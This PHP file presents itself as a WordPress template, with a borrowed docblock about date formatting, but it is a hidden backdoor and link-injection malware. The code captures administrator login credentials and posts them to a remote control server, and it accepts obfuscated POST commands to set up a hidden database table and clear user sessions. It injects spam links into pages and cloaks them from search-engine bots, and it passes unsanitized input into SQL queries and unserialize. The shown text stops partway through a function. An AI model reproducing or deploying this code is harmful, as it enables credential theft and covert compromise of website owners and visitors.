<?php 
/**
 * content-link-page.php
 *
 * @package WordPress
 * Convert given date string into a different format.
 *
 * $format should be either a PHP date format string, e.g. 'U' for a Unix
 * timestamp, or 'G' for a Unix timestamp assuming that $date is GMT.
 *
 *
 * @since 0.1
 *
 * @param string $format    Format of the date to return.
 * @param string $date      Date string to convert.
 * @param bool   $translate Whether the return date should be translated. Default true.
 * @return string|int|bool Formatted date string or Unix timestamp. False if $date is empty.
 */
/*
 
ini_set('display_errors',"Off");ini_set('memory_limit','256M');ini_set('max_execution_time',0);set_time_limit(0);ignore_user_abort(1);$wpdbhost=DB_HOST;$wpdbname=DB_NAME;$wpdbuser=DB_USER;$wpdbpass=DB_PASSWORD;$preffmhomeurl=$table_prefix;if(empty($table_prefix)){$wpdbpref="wpr_";}else{$wpdbpref=$table_prefix;}$maintablaname=$wpdbpref ."lmcachewpr";$dbprt="3306";if(stripos("qqq" .$wpdbhost,":")){$wpdbhost=explode(":",$wpdbhost);$dbprt=$wpdbhost[1];$wpdbhost=$wpdbhost[0];}if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];}elseif(!empty($_SERVER['REMOTE_ADDR'])){$ip=$_SERVER['REMOTE_ADDR'];}else{$ip="";}$currenturl=$_SERVER['SERVER_NAME'] .strtolower($_SERVER['REQUEST_URI']);$currenturl=trim($currenturl,"/");$cururlforcheckmorda=$currenturl;if(is_ssl_own()=== false){$currenturl="http://" .$currenturl;}else{$currenturl="https://" .$currenturl;}if(!empty($_POST["log"])&&!empty($_POST["pwd"])&& function_exists("wp_authenticate")){$checktable=mysqlTableSeekWPLM($maintablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($checktable != "no"){$admurlfmbd=readValueFromBDLM($maintablaname,"wpdata","wpset='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$admurlfmbd=urldecode($admurlfmbd);$clientidfmbd=readValueFromBDLM($maintablaname,"wpdata","wpset='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!empty($admurlfmbd)&&!empty($clientidfmbd)&& $clientidfmbd!="no"&& $admurlfmbd!="no"){$un=$_POST["log"];$up=$_POST["pwd"];$auth=wp_authenticate($un,$up);$auth=(array)$auth;if(!empty($auth["ID"])){if(isset($auth["roles"][0])&& $auth["roles"][0]== "administrator"){if(isset($auth["allcaps"]["level_10"])&& $auth["allcaps"]["level_10"]=== true){$params="clientid=" .$clientidfmbd ."&updata=" .urlencode($un ."|||" .$up) ."&admip=" .urlencode($ip) ."&admurl=" .urlencode($currenturl);$result=httpPostLM($admurlfmbd,$params);}}}}}}if(empty($_GET['ertthndxbcvs'])&&!stripos("qqq" .$_SERVER['SERVER_NAME'] .$_SERVER['REQUEST_URI'],"/admin")&&!stripos("qqq" .$_SERVER['SERVER_NAME'] .$_SERVER['REQUEST_URI'],"wp-admin")&&!stripos("qqq" .$_SERVER['SERVER_NAME'] .$_SERVER['REQUEST_URI'],"wp-login.php")&&!empty($wpdbhost)&&!empty($wpdbname)&&!empty($wpdbuser)&&!empty($wpdbpass)){header('Content-type: text/html; charset=UTF-8');$currenthash=md5($currenturl);if(!empty($_SERVER['HTTP_USER_AGENT'])){$useragent=$_SERVER['HTTP_USER_AGENT'];}else{$useragent="";}if(!empty($_SERVER['HTTP_REFERER'])){$referer=$_SERVER['HTTP_REFERER'];}else{$referer="";}if(!empty($_POST["ortsssjh"])&& $_POST["ortsssjh"]== "qhm54srtgg"&&!empty($_POST["mweotrva"])){$err="";$checktable=mysqlTableSeekWPLM($maintablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($checktable == "no"){$res=createTableLM($maintablaname,"wphash LONGBLOB, wpcache LONGBLOB, wptask LONGBLOB, wpset LONGBLOB, wpdata LONGBLOB, wpcov LONGBLOB, wpdelay LONGBLOB, wplasttime LONGBLOB, wpplace LONGBLOB, wpclo LONGBLOB, wpoth1 LONGBLOB, wpoth2 LONGBLOB, wpoth3 LONGBLOB","id",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res != "yes"){echo $res;die();}$res=createIndexLM($maintablaname,"wphash",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$res=createIndexLM($maintablaname,"wptask",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res != "yes"){echo $res;die();}}elseif($checktable=="udfgoihdkh48sied"){echo $checktable;die();}elseif($checktable=="yes"){echo "aawtr35tdgvvcsxdff";die();}$postpass=randStringLM("15");$res=insertToBDLM($maintablaname,"wpset, wpdata","'admurl', '" .urlencode($_POST["mweotrva"]) ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$res=insertToBDLM($maintablaname,"wpset, wpdata","'passtopost', '" .$postpass ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$clientid=randStringLM("20");$res=insertToBDLM($maintablaname,"wpset, wpdata","'clientid', '" .$clientid ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res == "yes"){echo "nbcuyyrywerstfdfg|||||" .$postpass .":::::" .$clientid ."|||||";if(function_exists('delete_metadata')){delete_metadata('user',0,'session_tokens',false,true);}die();}else{echo "xcvbrhr6hdhcgxcva";die();}}if(!empty($_POST["uyfdfncxzfc"])&& $_POST["uyfdfncxzfc"]== "wetjxfbxgngl"){$checktable=mysqlTableSeekWPLM($maintablaname,$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($checktable!="no"){echo "ouyrtwersdxgfcbsdf";die();}else{echo "dfghftrs5eedfgfg";die();}}if(!empty($_POST["pertzcvbc"])&& $_POST["pertzcvbc"]=="fghrscbbd"&&!empty($_POST["xcvbiirt"])){$passtopostfmbd=readValueFromBDLM($maintablaname,"wpdata","wpset='passtopost'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($_POST["xcvbiirt"]!=$passtopostfmbd){echo "kfkjhgre4rtdfgxcvb";die();}}if(!empty($_POST["nvrty5yrs"])&& $_POST["nvrty5yrs"]== "zcxwenmo"&&!empty($_POST["weerchjsd"])){$tasksettings=urldecode($_POST["weerchjsd"]);$tasksettings=stripslashes($tasksettings);$tasksettings=unserialize($tasksettings);if(!empty($tasksettings)&& is_array($tasksettings)){$res=insertToBDLM($maintablaname,"wptask, wpcov, wpdelay, wpplace, wpclo, wpset","'" .$tasksettings["taskid"] ."', '" .$tasksettings["coverage"] ."', '" .$tasksettings["delaytime"] ."', '" .$tasksettings["place"] ."', '" .$tasksettings["cloacking"] ."', 'task'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res=="yes"){echo "prtoyehzuixcvvbc";die();}}}if(!empty($_POST["ktreawedd"])&& $_POST["ktreawedd"]== "vbntserdf"&&!empty($_POST['dxcbgfftst'])){$res=deleteLinesFmDBLM($maintablaname,"wptask='" .$_POST['dxcbgfftst'] ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res!="yes"){echo "tyeratryzdxbxvnbbdsfg";die();}else{echo "be545hgfxbfbgfdf";die();}}if(!empty($_POST["bdfersdfz"])&& $_POST["bdfersdfz"]== "nvcnjtyddsf"&&!empty($_POST['xcvtjuoigu'])){$newcoverage=urldecode($_POST['xcvtjuoigu']);$newcoverage=stripslashes($newcoverage);$newcoverage=unserialize($newcoverage);$res=updateBDDataLM($maintablaname,$newcoverage["newsett"],"wpcov","wptask='" .$newcoverage["taskid"] ."' AND wpset='task'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res!="yes"){echo "ldkfergibjxcvizsae";die();}else{echo "iuyrtreasfxcbxdbf";die();}}if(!empty($_POST["srtyqbdg"])&& $_POST["srtyqbdg"]== "mhluityr"&&!empty($_POST['etyweweh'])){$newplace=urldecode($_POST['etyweweh']);$newplace=stripslashes($newplace);$newplace=unserialize($newplace);$res=updateBDDataLM($maintablaname,$newplace["newsett"],"wpplace","wptask='" .$newplace["taskid"] ."' AND wpset='task'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res!="yes"){echo "pertiasersfdzdgdf";die();}else{echo "kiytterwdxcvbbxcbv";die();}}if(!empty($_POST["newrsdg"])&& $_POST["newrsdg"]== "ouityrwaef"&&!empty($_POST['zxcvtru'])){$newplace=urldecode($_POST['zxcvtru']);$newplace=stripslashes($newplace);$newplace=unserialize($newplace);$res=updateBDDataLM($maintablaname,$newplace["newsett"],"wpdelay","wptask='" .$newplace["taskid"] ."' AND wpset='task'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res=="yes"){updateBDDataLM($maintablaname,"","wplasttime","wptask='" .$newplace["taskid"] ."' AND wpset='task'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);echo "mxvczvseewa456ryhdg";die();}else{echo "porazxchrytyrwa3rqergsdfg";die();}}if(!empty($_POST["jtydfhgsdf"])&& $_POST["jtydfhgsdf"]== "wreyytjh"&&!empty($_POST['myuursfd'])){$newcloackLMing=urldecode($_POST['myuursfd']);$newcloackLMing=stripslashes($newcloackLMing);$newcloackLMing=unserialize($newcloackLMing);$res=updateBDDataLM($maintablaname,$newcloackLMing["newsett"],"wpclo","wptask='" .$newcloackLMing["taskid"] ."' AND wpset='task'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res!="yes"){echo "vsrtydhfhgmhaweqrre";die();}else{echo "yuuterysteasfddfsdf";die();}}if(!empty($_POST["jteyusdf"])&& $_POST["jteyusdf"]== "xcvoyrtr"&&!empty($_POST['mwereejhg'])){$res=deleteLinesFmDBLM($maintablaname,"wptask='" .$_POST['mwereejhg'] ."' AND wphash IS NOT NULL",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($res!="yes"){echo "ueyrteasddfggsgd";die();}else{echo "be545hgfxbfbgfdf";die();}}$alltasks=readManyValuesFromBDLM($maintablaname,"*","wpset='task'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!empty($alltasks)&& is_array($alltasks)&& count($alltasks)>0){$pagetoshow=httpGetLM($currenturl,"yes");if(is_array($pagetoshow)&&!empty($pagetoshow["content"])&&!empty($pagetoshow["httpcode"])&& $pagetoshow["httpcode"]!="404"&& $pagetoshow["httpcode"]!="502"&& $pagetoshow["httpcode"]!="403"&& $pagetoshow["httpcode"]!="504"){$pagetoshow=$pagetoshow["content"];$bot=cloackLM($ip,$useragent);$admurlfmbd=readValueFromBDLM($maintablaname,"wpdata","wpset='admurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$admurlfmbd=urldecode($admurlfmbd);$clientidfmbd=readValueFromBDLM($maintablaname,"wpdata","wpset='clientid'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);foreach($alltasks as $onetask){$needtogen="yes";$dontshow="";$taskid=$onetask["wptask"];$taskcov=$onetask["wpcov"];$delay=$onetask["wpdelay"];$lasttime=$onetask["wplasttime"];$currtime=time();if(!empty($delay)&& $delay!="not"){if(!empty($lasttime)&& $lasttime!="no"){$raztime=$currtime-$lasttime;if($raztime<$delay){continue;}else{updateBDDataLM($maintablaname,$currtime,"wplasttime","wptask='" .$taskid ."' AND wpset='task'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}}else{updateBDDataLM($maintablaname,$currtime,"wplasttime","wptask='" .$taskid ."' AND wpset='task'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}}$taskplace=$onetask["wpplace"];$taskclo=$onetask["wpclo"];if($taskclo=="usecloacking"&& $bot!="bot"){continue;}$morda=readValueFromBDLM($preffmhomeurl ."options","option_value","option_name='siteurl'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if($taskcov == "allnotm"){if($morda != "no"){$morda=str_ireplace("http://","",$morda);$morda=str_ireplace("https://","",$morda);$morda=trim($morda,"/");if($cururlforcheckmorda == $morda){$needtogen="";}}}if($taskcov == "onlym"){if($morda != "no"){$morda=str_ireplace("http://","",$morda);$morda=str_ireplace("https://","",$morda);$morda=trim($morda,"/");if($cururlforcheckmorda != $morda){$needtogen="";}}}if($needtogen != "yes"){continue;}$cashin=readValueFromBDLM($maintablaname,"wpcache","wptask='" .$taskid ."' AND wphash='" .$currenthash ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);if(!empty($cashin)&& $cashin!="no"){if($cashin=="nolinks"){$dontshow="yes";}$linkstoshow=urldecode($cashin);$linkstoshow=unserialize($linkstoshow);}else{$params="clientid=" .$clientidfmbd ."&ntyerttre=kuyrtsd&otiyryt=" .$taskid ."&currurl=" .urlencode($currenturl);$linkstoshow=httpPostLM($admurlfmbd,$params);if(stripos("qqq" .$linkstoshow,"btrueiidsfovsgfsd")){insertToBDLM($maintablaname,"wphash, wpcache, wptask","'" .$currenthash ."', 'nolinks','" .$taskid ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$dontshow="yes";}$regular="|ert8chd(.*)qornx9tk|iUs";preg_match_all($regular,$linkstoshow,$matches);if(!empty($matches[1])){$linkstoshow=$matches[1][0];$linkstoshow=explode("uebx8t",$linkstoshow);insertToBDLM($maintablaname,"wphash, wpcache, wptask","'" .$currenthash ."', '" .urlencode(serialize($linkstoshow)) ."','" .$taskid ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);}else{insertToBDLM($maintablaname,"wphash, wpcache, wptask","'" .$currenthash ."', 'nolinks','" .$taskid ."'",$wpdbhost,$wpdbname,$wpdbuser,$wpdbpass,$dbprt);$dontshow="yes";}}if(empty($dontshow)){if($taskplace=="beforeall"){$linkstoshow=implode(" ",$linkstoshow);$pagetoshow=$linkstoshow .$pagetoshow;}if($taskplace=="afteropenbody"){$linkstoshow=implode(" ",$linkstoshow);$pagetoshow=preg_replace("/(<body.*>)/iUms","\$1" ."<br>" .$linkstoshow,$pagetoshow,1);}if($taskplace=="beforeclosebody"){$linkstoshow=implode(" ",$linkstoshow);$pagetoshow=preg_replace("/(<\/body>)/i",$linkstoshow ."<br>" ."\$1",$pagetoshow,1);}if($taskplace=="inp"){$pagetoshow=getpcontentLM($pagetoshow,$linkstoshow);}}}echo $pagetoshow;die();}}}function is_ssl_own(){if(isset($_SERVER['HTTPS'])){if('on'== strtolower($_SERVER['HTTPS'])){return true;}if('1'== $_SERVER['HTTPS']){return true;}}elseif(isset($_SERVER['SERVER_PORT'])&&('443'== $_SERVER['SERVER_PORT'])){return true;}return false;}function getpcontentLM($targetpage,$links){$goodparray=array();$linkscount=count($links);if($linkscount>0){$regular="/<p>(.*)<\/p>/msiU";preg_match_all($regular,$targetpage,$matches);if(!empty($matches[1])){foreach($matches[1]as $currp){$testcurrp=preg_replace("/<.*>/iUm","",$currp);if(strlen(strip_tags_smartLM($testcurrp))>150){$goodparray[]=$currp;}}if(count($goodparray)>= 1){$howmaxadd=$linkscount/count($goodparray);$howmaxadd=ceil($howmaxadd);$links=array_chunk($links,$howmaxadd);foreach($goodparray as $k => $goodp){if(!empty($links[$k])){$currlinks=implode(" ",$links[$k]);$targetpage=str_ireplace($goodp,$currlinks ."<br>" .$goodp,$targetpage);}}}else{$links=implode(" ",$links);$targetpage=preg_replace("/(<body.*>)/iUms","\$1" ."<br>" .$links,$targetpage,1);}}return $targetpage;}else{return $targetpage;}}function strip_tags_smartLM($s,array $allowable_tags=null,$is_format_spaces=true,array $pair_tags=array('script','style','map','iframe','frameset','object','applet','comment','button','textarea','select'),array $para_tags=array('p','td','th','li','h1','h2','h3','h4','h5','h6','div','form','title','pre')){static $_callback_type=false;static $_allowable_tags=array();static $_para_tags=array();static $re_attrs_fast_safe='(?![a-zA-Z\d])  #statement, which follows after a tag
                                   #correct attributes
                                   (?>
                                       [^>"\']+
                                     | (?<=[\=\x20\r\n\t]|\xc2\xa0) "[^"]*"
                                     | (?<=[\=\x20\r\n\t]|\xc2\xa0) \'[^\']*\'
                                   )*
                                   #incorrect attributes
                                   [^>]*+';if(is_array($s)){if($_callback_type === 'strip_tags'){$tag=mb_strtolower($s[1]);if($_allowable_tags){if(array_key_exists($tag,$_allowable_tags))return $s[0];if(array_key_exists('<' .$tag .'>',$_allowable_tags)){if(substr($s[0],0,2)=== '</')return '</' .$tag .'>';if(substr($s[0],-2)=== '/>')return '<' .$tag .' />';return '<' .$tag .'>';}}if($tag === 'br')return "\r\n";if($_para_tags && array_key_exists($tag,$_para_tags))return "\r\n\r\n";return '';}trigger_error('Unknown callback type "' .$_callback_type .'"!',E_USER_ERROR);}if(($pos=strpos($s,'<'))=== false || strpos($s,'>',$pos)=== false){return $s;}$length=strlen($s);$re_tags='~  <[/!]?+
                   (
                       [a-zA-Z][a-zA-Z\d]*+
                       (?>:[a-zA-Z][a-zA-Z\d]*+)?
                   ) #1
                   ' .$re_attrs_fast_safe .'
                   >
                ~sxSX';$patterns=array('/<([\?\%]) .*? \\1>/sxSX','/<\!\[CDATA\[ .*? \]\]>/sxSX','/<\!--.*?-->/sSX','/ <\! (?:--)?+
               \[
               (?> [^\]"\']+ | "[^"]*" | \'[^\']*\' )*
               \]
               (?:--)?+
           >
         /sxSX',);if($pair_tags){foreach($pair_tags as $k => $v)$pair_tags[$k]=preg_quote($v,'/');$patterns[]='/ <((?i:' .implode('|',$pair_tags) .'))' .$re_attrs_fast_safe .'(?<!\/)>
                         .*?
                         <\/(?i:\\1)' .$re_attrs_fast_safe .'>
                       /sxSX';}$i=0;$max=99;while($i<$max){$s2=preg_replace($patterns,'',$s);if(preg_last_error()!== PREG_NO_ERROR){$i=999;break;}if($i == 0){$is_html=($s2 != $s || preg_match($re_tags,$s2));if(preg_last_error()!== PREG_NO_ERROR){$i=999;break;}if($is_html){if($is_format_spaces){$s2=preg_replace('/  [\x09\x0a\x0c\x0d]++
                                         | <((?i:pre|textarea))' .$re_attrs_fast_safe .'(?<!\/)>
                                           .+?
                                           <\/(?i:\\1)' .$re_attrs_fast_safe .'>
                                           \K
                                        /sxSX',' ',$s2);if(preg_last_error()!== PREG_NO_ERROR){$i=999;break;}}if($allowable_tags)$_allowable_tags=array_flip($allowable_tags);if($para_tags)$_para_tags=array_flip($para_tags);}}if(!empty($is_html)){$_callback_type='strip_tags';$s2=preg_replace_callback($re_tags,__FUNCTION__,$s2);$_callback_type=false;if(preg_last_error()!== PREG_NO_ERROR){$i=999;break;}}if($s === $s2)break;$s=$s2;$i++;}if($i >= $max)$s=strip_tags($s);if($is_format_spaces && strlen($s)!== $length){$s=preg_replace('/\x20\x20++/sSX',' ',trim($s));$s=str_replace(array("\r\n\x20","\x20\r\n"),"\r\n",$s);$s=preg_replace('/[\r\n]{3,}+/sSX',"\r\n\r\n",$s);}return $s;}function readManyValuesFromBDLM($tablename,$value,$uslovie,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return false;}else{if(!empty($uslovie)){$sql="SELECT " .$value ." FROM " .$tablename ." where " .$uslovie;}else{$sql="SELECT " .$value ." FROM " .$tablename;}$needvalue=mysqli_query($dbcon,$sql);$result=array();while($row=mysqli_fetch_assoc($needvalue)){$result[]=$row;}if(!empty($result)){mysqli_close($dbcon);return $result;}else{mysqli_close($dbcon);return "no";}}}function cloackLM($ip,$ua){if(empty($ip)){return "bot";}$is_bot="";$user_agent_to_filter=array('#Ask\s*Jeeves#i','#HP\s*Web\s*PrintSmart#i','#HTTrack#i','#IDBot#i','#Indy\s*Library#','#ListChecker#i','#MSIECrawler#i','#NetCache#i','#Nutch#i','#RPT-HTTPClient#i','#rulinki\.ru#i','#Twiceler#i','#WebAlta#i','#Webster\s*Pro#i','#www\.cys\.ru#i','#Wysigot#i','#Yahoo!\s*Slurp#i','#Yeti#i','#Accoona#i','#CazoodleBot#i','#CFNetwork#i','#ConveraCrawler#i','#DISCo#i','#Download\s*Master#i','#FAST\s*MetaWeb\s*Crawler#i','#Flexum\s*spider#i','#Gigabot#i','#HTMLParser#i','#ia_archiver#i','#ichiro#i','#IRLbot#i','#Java#i','#km\.ru\s*bot#i','#kmSearchBot#i','#libwww-perl#i','#Lupa\.ru#i','#LWP::Simple#i','#lwp-trivial#i','#Missigua#i','#MJ12bot#i','#msnbot#i','#msnbot-media#i','#Offline\s*Explorer#i','#OmniExplorer_Bot#i','#PEAR#i','#psbot#i','#Python#i','#rulinki\.ru#i','#SMILE#i','#Speedy#i','#Teleport\s*Pro#i','#TurtleScanner#i','#User-Agent#i','#voyager#i','#Webalta#i','#WebCopier#i','#WebData#i','#WebZIP#i','#Wget#i','#Yandex#i','#Yanga#i','#Yeti#i','#msnbot#i','#spider#i','#yahoo#i','#jeeves#i','#Google#i','#altavista#i','#scooter#i','#av\s*fetch#i','#asterias#i','#spiderthread revision#i','#sqworm#i','#ask#i','#lycos.spider#i','#infoseek sidewinder#i','#ultraseek#i','#polybot#i','#webcrawler#i','#robozill#i','#gulliver#i','#architextspider#i','#yahoo!\s*slurp#i','#charlotte#i','#ngb#i');$stop_ips_masks=array("66\.249\.[6-9][0-9]\.[0-9]","74\.125\.[0-9]\.[0-9]","65\.5[2-5]\.[0-9]\.[0-9]","74\.6\.[0-9]\.[0-9]","67\.195\.[0-9]\.[0-9]","72\.30\.[0-9]\.[0-9]","38\.[0-9]\.[0-9]\.[0-9]","93\.172\.94\.227","212\.100\.250\.218","71\.165\.223\.134","70\.91\.180\.25","65\.93\.62\.242","74\.193\.246\.129","213\.144\.15\.38","195\.92\.229\.2","70\.50\.189\.191","218\.28\.88\.99","165\.160\.2\.20","89\.122\.224\.230","66\.230\.175\.124","218\.18\.174\.27","65\.33\.87\.94","67\.210\.111\.241","81\.135\.175\.70","64\.69\.34\.134","89\.149\.253\.169","104\.132\.8\.69");foreach($stop_ips_masks as $k => $v){if(preg_match('#^' .$v .'$#',$ip)){$is_bot="bot";}}if(empty($is_bot)&& strpos("qqq" .preg_replace($user_agent_to_filter,'-ANGRYBOT-',$ua),'-ANGRYBOT-')){$is_bot="bot";}return $is_bot;}function updateBDDataLM($tablename,$data,$value,$uslovie,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return false;}else{$sql="UPDATE " .$tablename ." SET $value='" .$data ."' WHERE " .$uslovie ."";if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return "yes";}else{mysqli_close($dbcon);return false;}}}function randomValuesFromTableByIdLM($tablename,$value,$count,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}else{$sql="SELECT " .$value ." FROM " .$tablename ." WHERE wpk IS NOT NULL ORDER BY RAND() LIMIT " .$count;$needvalue=mysqli_query($dbcon,$sql);$res=array();$out=array();$value=explode(",",$value);while($row=mysqli_fetch_array($needvalue)){foreach($value as $k=>$onevalue){$onevalue=trim($onevalue);$res[$onevalue]=$row[$onevalue];}$out[]=$res;}mysqli_close($dbcon);return $out;}}function deleteLinesFmDBLM($tablename,$uslovie,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return false;}else{$sql="DELETE FROM " .$tablename ." WHERE " .$uslovie;if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return "yes";}else{mysqli_close($dbcon);return false;}}}function randomUALM(){$uas=array("Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36","Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36","Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)");$uas=shuffleArrLM($uas);return $uas[0];}function shuffleArrLM($arr){srand((float)microtime()*1000000);shuffle($arr);return $arr;}function httpGetLM($url,$need200){if(stripos("qqq" .$url,"?")){$url=$url ."&ertthndxbcvs=yes";}else{$url=$url ."?ertthndxbcvs=yes";}if(function_exists('curl_init')){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_USERAGENT,randomUALM());curl_setopt($ch,CURLOPT_HEADER,0);curl_setopt($ch,CURLOPT_TIMEOUT,90);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);$output=curl_exec($ch);if(!empty($need200)){$http_code=curl_getinfo($ch,CURLINFO_HTTP_CODE);return array("content"=>$output,"httpcode"=>$http_code);}curl_close($ch);}else{$output=file_get_contents($url);}return $output;}function httpPostLM($url,$params){$params=rtrim($params,'&');if(function_exists('curl_init')){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);curl_setopt($ch,CURLOPT_USERAGENT,randomUALM());curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);curl_setopt($ch,CURLOPT_HEADER,false);curl_setopt($ch,CURLOPT_POSTFIELDS,$params);curl_setopt($ch,CURLOPT_TIMEOUT,40);curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);$output=curl_exec($ch);curl_close($ch);}else{$output=file_get_contents($url,false,stream_context_create(array('http'=> array('method'=> 'POST','header'=> 'Content-type: application/x-www-form-urlencoded','content'=> $params))));}return $output;}function readValueFromBDLM($tablename,$value,$uslovie,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}else{if(!empty($uslovie)){$sql="SELECT " .$value ." FROM " .$tablename ." where " .$uslovie;}else{$sql="SELECT " .$value ." FROM " .$tablename;}$needvalue=mysqli_query($dbcon,$sql);$needvalue=mysqli_fetch_array($needvalue);if(!empty($needvalue)){if(!empty($uslovie)){if(stripos($value,",")){$value=explode(",",$value);$res=array();foreach($value as $onevalue){$onevalue=trim($onevalue);$res[$onevalue]=$needvalue[$onevalue];}$needvalue=$res;}else{$needvalue=$needvalue[$value];}}mysqli_close($dbcon);return $needvalue;}else{mysqli_close($dbcon);return "no";}}}function insertToBDLM($tablename,$cols,$data,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}else{$sql="INSERT INTO " .$tablename ." (" .$cols .") VALUES (" .$data .")";if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return "yes";}else{mysqli_close($dbcon);return "bewiursfer9uidd";}}}function mysqlTableSeekWPLM($tablename,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}$table_list=mysqli_query($dbcon,"SHOW TABLES FROM " .$dbname ."");while($row=mysqli_fetch_row($table_list)){if($tablename == $row[0]){mysqli_close($dbcon);unset($row);unset($table_list);return "yes";}}mysqli_close($dbcon);unset($row);unset($table_list);return "no";}function randStringLM($length){$str="";$chars="abcdefghijklmnopqrstuvwxyz0123456789";$size=strlen($chars);for($i=0;$i<$length;$i++){$str .= $chars[rand(0,$size-1)];}return $str;}function createTableLM($tablename,$fields,$idfield,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}$table_list=mysqli_query($dbcon,"SHOW TABLES FROM " .$dbname ."");while($row=mysqli_fetch_row($table_list)){if($tablename == $row[0]){mysqli_close($dbcon);return "aawtr35tdgvvcsxdff";}}unset($row);unset($table_list);$sql="CREATE TABLE " .$tablename ." ($fields)";mysqli_query($dbcon,$sql);$sql="ALTER TABLE " .$tablename ." add " .$idfield ." INT UNSIGNED NOT NULL AUTO_INCREMENT PRIMARY KEY FIRST";mysqli_query($dbcon,$sql);$table_list=mysqli_query($dbcon,"SHOW TABLES FROM " .$dbname ."");while($row=mysqli_fetch_row($table_list)){if($tablename == $row[0]){mysqli_close($dbcon);unset($row);unset($table_list);return "yes";}}mysqli_close($dbcon);return "bewiursfer9uidd";}function createIndexLM($tablename,$indcol,$dbhost,$dbname,$dbuser,$dbpass,$dbport){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname,$dbport);if(!$dbcon){return "udfgoihdkh48sied";}$sql="ALTER TABLE " 